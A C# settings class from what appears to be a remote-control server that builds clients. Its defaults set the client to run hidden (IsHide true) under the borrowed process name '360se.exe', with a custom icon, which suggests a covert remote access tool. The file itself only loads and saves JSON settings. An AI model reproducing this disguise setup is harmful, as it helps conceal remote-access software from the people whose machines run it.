using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Newtonsoft.Json;

namespace RemoteControl.Server
{
    class Settings
    {
        const string SettingFileName = "config.json";
        public static Settings CurrentSettings = new Settings(); 
        public ClientParas ClientPara = new ClientParas();
        public int ServerPort;
        public string SkinPath;

        static Settings()
        {
            try
            {
                if (System.IO.File.Exists(SettingFileName))
                {
                    string json = System.IO.File.ReadAllText(SettingFileName);
                    Settings.CurrentSettings = JsonConvert.DeserializeObject<Settings>(json);
                }
                else
                {
                    Settings.CurrentSettings = new Settings()
                    {
                        ServerPort = 10010,
                        SkinPath = null,
                        ClientPara = new ClientParas()
                        {
                            ServerIP = "127.0.0.1",
                            ServerPort = 10010,
                            ServiceName = "360se.exe",
                            OnlineAvatar = "16238_100.png",
                            IsHide = true,
                            ClientIconPath = null
                        }
                    };
                }
            }
            catch (Exception ex)
            {
            }
        }

        public static void SaveSettings()
        {
            if (Settings.CurrentSettings == null)
                return;
            string json = JsonConvert.SerializeObject(Settings.CurrentSettings);
            System.IO.File.WriteAllText(SettingFileName, json);
        }
    }

    class ClientParas
    {
        public string ServerIP;
        public int ServerPort;
        public string ServiceName;
        public string OnlineAvatar;
        public bool IsHide;
        public string ClientIconPath;
    }
}
